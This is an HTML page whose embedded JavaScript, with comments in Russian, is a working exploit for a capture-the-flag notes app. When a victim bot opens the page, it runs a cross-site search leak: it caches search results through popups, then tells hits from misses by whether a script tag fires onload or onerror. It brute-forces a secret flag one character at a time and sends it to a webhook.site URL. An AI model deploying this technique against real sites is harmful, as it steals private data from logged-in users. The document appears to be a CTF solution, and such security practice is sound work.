<!doctype html>
<meta charset="utf-8">
<title>average-contrived-notes-app exploit</title>
<body>
<pre id="log">bot жду здесь. Этот файл сам себя не репортит.
Открой хостнутую страницу, потом её URL вставь в поле report url на челлендже.</pre>
<script>
const SITE = 'https://average-contrived-notes-app.shrimple.de';

// Поменяй на свой webhook / bin / сервер для приёма флага
const EXFIL = 'https://webhook.site/8c8d42bd-7c61-4dc8-b8b0-9b439cacf9fe';

const ALPHABET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}-!@#$%^&*()+=:,./?';
let prefix = 'RS{';

const logEl = document.getElementById('log');
function log(s){ logEl.textContent += '\\n' + s; console.log(s); }
function sleep(ms){ return new Promise(r => setTimeout(r, ms)); }

function probe(guess) {
  return new Promise(async (resolve) => {
    const nonce = Math.random().toString(36).slice(2);
    const url = `${SITE}/api/notes?search=${encodeURIComponent(guess)}&x=${nonce}`;

    // 1. top-level navigation, чтобы Lax-cookie ушла и ответ положился в cache
    const w = window.open(url, '_blank', 'popup,width=220,height=120');
    await sleep(1800);
    try { if (w && !w.closed) w.close(); } catch {}

    // 2. тот же URL как script
    // пустой ответ => valid empty JS => onload
    // непустой ответ с флагом => invalid JS => onerror
    const s = document.createElement('script');
    let done = false;

    function finish(v) {
      if (done) return;
      done = true;
      s.remove();
      resolve(v);
    }

    s.onload = () => finish(false);
    s.onerror = () => finish(true);
    s.src = url;
    document.body.appendChild(s);

    setTimeout(() => finish(false), 4000);
  });
}

async function brute() {
  log('starting with ' + prefix);

  while (!prefix.endsWith('}')) {
    let found = false;

    for (const ch of ALPHABET) {
      const guess = prefix + ch;
      log('try ' + guess);

      const ok = await probe(guess);
      if (ok) {
        prefix = guess;
        log('hit => ' + prefix);
        found = true;
        break;
      }
      await sleep(250);
    }

    if (!found) {
      log('no next char found, попробуй расширить alphabet или поднять sleep');
      return;
    }
  }

  log('FLAG = ' + prefix);

  try {
    await fetch(EXFIL + '?flag=' + encodeURIComponent(prefix), { mode: 'no-cors' });
    log('sent to exfil');
  } catch (e) {
    log('exfil failed: ' + e);
  }
}

brute();
</script>
